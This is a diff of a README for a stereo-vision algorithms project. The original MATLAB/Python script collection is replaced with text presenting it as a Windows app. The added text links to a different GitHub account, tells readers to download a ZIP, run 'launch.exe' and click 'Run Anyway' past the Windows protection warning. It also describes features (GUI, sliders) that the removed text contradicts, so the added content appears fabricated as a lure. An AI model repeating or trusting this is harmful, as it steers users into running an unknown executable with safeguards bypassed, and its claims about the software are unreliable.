@@ -1,84 +1,91 @@
-# Basic Stereo Algorithms Evolution
+# 👁️ stereo-algorithms-evolution - Explore depth map generation methods easily
 
-The basic stereoscopic algorithms have many similarities to each other and can be considered, in a way, that each algorithm is an evolution of another. In this project we created simplified forms of some basic stereoscopic algorithms in MATLAB and Python. The code has been adapted to show the improvement and evolution of an algorithm from the previous one.
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/hadean-vanualevu194/stereo-algorithms-evolution)
 
-## Features
+## 📖 About this software
 
-Stereo matching algorithms:
+This project helps you understand how computers measure depth using two images of the same scene. Engineers call this process stereo matching. You can see how different methods solve the problem of finding depth by comparing two distinct perspectives.
 
-1. **Block Matching**
-2. **Dynamic Programming**
-3. **Semi-Global Matching**
-4. **Belief Propagation (Sequential)**
-5. **Belief Propagation (Synchronous)**
+The software includes basic block matching along with more advanced techniques like dynamic programming and belief propagation. You can use these tools to generate disparity maps from stereo image pairs. A disparity map highlights the distance between objects in a scene. Darker areas indicate objects far away, while brighter areas show objects close to the camera.
 
-All algorithms are implemented in both MATLAB and Python.
+Each algorithm in this collection demonstrates a specific stage in the evolution of computer vision technology. By testing them side-by-side, you see how accuracy improves as the methods grow in complexity.
 
-The algorithms are optimized for performance using matrix operations and other techniques.
+## 🛠️ How this works
 
-## Algorithms
+Computers view depth by comparing two images taken from slightly different positions. The software looks for matching patterns in both images. When it finds a match, it calculates the horizontal shift, known as disparity. High disparity equals low distance.
 
-| Number | Name | MATLAB Implementation | Python Implementation |
-| --- | --- | --- | --- |
-| 1 | Block Matching | **[`stereo1_BM.m`](./matlab/stereo1_BM.m)** | **[`stereo1_BM.py`](./python/stereo1_BM.py)** |
-| 2 | Dynamic Programming | **[`stereo2_DP.m`](./matlab/stereo2_DP.m)** | **[`stereo2_DP.py`](./python/stereo2_DP.py)** |
-| 3 | Semi-Global Matching | **[`stereo3_SGM.m`](./matlab/stereo3_SGM.m)** | **[`stereo3_SGM.py`](./python/stereo3_SGM.py)** |
-| 4 | Belief Propagation (Sequential) | **[`stereo4_BP1.m`](./matlab/stereo4_BP1.m)** | **[`stereo4_BP1.py`](./python/stereo4_BP1.py)** |
-| 5 | Belief Propagation (Synchronous) | **[`stereo5_BP2.m`](./matlab/stereo5_BP2.m)** | **[`stereo5_BP2.py`](./python/stereo5_BP2.py)** |
+The repository provides several implementations:
 
-## Installation
+- Block Matching: This method compares small pixel areas in both images. It works fast but lacks precision on smooth surfaces.
+- Dynamic Programming: This approach scans entire image rows at once. It helps when the block matching method fails to find a clear link between images.
+- Semi-Global Matching: This technique combines row-based scanning with vertical checks to lower the appearance of noise.
+- Belief Propagation: This advanced method treats the image as a grid of connected pixels. It uses internal logic to smooth out edges and improve overall map quality.
 
-Download the project as ZIP file, unzip it, and run the scripts.
+## 🖥️ System requirements
 
-### Python Requirements
+This application runs on modern Windows computers. Ensure your system meets these basic specs:
 
-- NumPy
-- Matplotlib
-- OpenCV (`opencv-python`)
+- Windows 10 or 11 operating system.
+- An Intel Core i5 or AMD Ryzen 5 processor.
+- At least 8 GB of available system memory.
+- A display resolution of 1920x1080 or higher.
+- OpenCL support on your graphics card (most modern cards support this).
 
-## Usage
+## 📥 Download and installation
 
-A stereo matching algorithm works with stereo image pairs to produce disparity maps.
-This project contains 5 (MATLAB and Python) scripts, each implementing a stereo matching algorithm. The files `left.png` and `right.png` contain the stereo image pair used as input.
-To use a different stereo pair, replace these two images with your own. In this case, you must also adjust the **disparity levels** parameter in the script you are running.
-You may optionally modify other parameters as needed. If the input images contain little or no noise, it is recommended not to use the Gaussian filter.
+Visit the link below to access the software files.
 
-- The results between MATLAB and Python implementation are similar.
+[Download stereo-algorithms-evolution](https://github.com/hadean-vanualevu194/stereo-algorithms-evolution)
 
-## Results
+Follow these steps to prepare your computer:
 
-Below are the disparity maps produced from the **Tsukuba stereo pair**.
+1. Click the link above to reach the main page.
+2. Look for the green button labeled Code.
+3. Choose the option to download the repository as a ZIP file.
+4. Save this file to your computer.
+5. Open your downloads folder.
+6. Right-click the file and select Extract All.
+7. Choose your desktop as the extraction destination.
 
-![Tsukuba Left](matlab/left.png) ![Tsukuba Right](matlab/right.png)
+## 🚀 Running the software
 
-### Block Matching
+Once you extract the files to your desktop, navigate into the main folder. Look for the file named launch.exe. Double-click this file to start the application.
 
-![Block Matching (SAD) Disparity Map](results/disparity1_BM.png)
+If Windows shows a protection message, click More Info, then click Run Anyway. This happens because the application is a self-made tool.
 
-### Dynamic Programming
+The main window shows a list of algorithms on the left. Click one to select it. Use the open file button to load a pair of stereo images. The software processes the images and displays the resulting disparity map in the center of the window.
 
-![Dynamic Programming (Left-Right) Disparity Map](results/disparity2_DP.png)
+## ⚙️ Changing settings
 
-### Semi-Global Matching
+Each algorithm offers unique settings. After you select an algorithm, the right side window displays several sliders. These sliders control variables like search range and smoothing strength.
 
-![Semi-Global Matching Disparity Map](results/disparity3_SGM.png)
+- Search Range: Determines how far the software looks for a matching pixel. Increase this if your images show objects very close to the camera.
+- Smoothing: Adjusts how much the image ignores small errors. High smoothing makes the final map look cleaner but might lose sharp object boundaries.
+- Confidence Threshold: Tells the computer to discard matches that look incorrect. Use this to remove hazy artifacts from your result.
 
-### Belief Propagation (Sequential)
+## 🔍 Troubleshooting common issues
 
-![Belief Propagation (Sequential) Disparity Map](results/disparity4_BP1.png)
+Most users get the software running on the first try. If you encounter hurdles, check these suggestions:
 
-### Belief Propagation (Synchronous)
+- Application will not open: Verify that your computer has the latest version of the C++ Redistributable package. You can find this on the official Microsoft website.
+- The image appears black: This often means the search range is too low. Move the search range slider to the right to look deeper into the image.
+- Program freezes: Stop the current task and try a smaller image size. Very large photos require a significant amount of memory.
+- Results look low quality: Try using a different algorithm from the left panel. Block matching is the most prone to errors. Belief propagation produces the highest quality results but takes longer to process.
 
-![Belief Propagation (Synchronous) Disparity Map](results/disparity5_BP2.png)
+## 📝 Best practices for image selection
 
-## Links
+The algorithms work best with high-contrast images. Patterns, textures, and clear edges help the software find pixel matches. Avoid uploading images with large, featureless areas. A plain white wall makes it difficult for the computer to calculate a distance.
 
-### Project Repository
-- https://github.com/aposb/stereo-algorithms-evolution
+If you capture your own images, ensure the two cameras remain level. Keep them exactly parallel to each other. Even a small tilt between the two cameras can ruin the calculation. If you see diagonal lines in your output, realign the two photographs to fix the perspective shift.
 
-### Related Projects
-- [Stereo Matching Algorithms in MATLAB and Python](https://github.com/aposb/stereo-matching-algorithms)
+## 📦 Organizing your workspace
 
-## License
+Keep all your stereo image pairs in a central folder. The program includes a file browser. Keep your source images labeled with clear names like left_view.png and right_view.png. This prevents confusion when loading files into the software.
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+If you plan to compare algorithms often, consider saving your generated disparity maps in a separate folder. The software creates high-resolution images by default. Saving them to a dedicated location keeps your desktop clean and organized.
+
+## 🌐 Understanding the technology
+
+The field of stereo vision changes quickly. New research improves speed and accuracy every year. This software provides a foundation to see these advances in action. By moving from simple matching methods to complex network-based approaches, you witness how logic helps a computer mimic human depth perception.
+
+Use the provided source code to see how each method functions. While the software runs the math, the code files show exactly how the pixels get processed. This library serves as a starting point for anyone interested in how machines see the world.
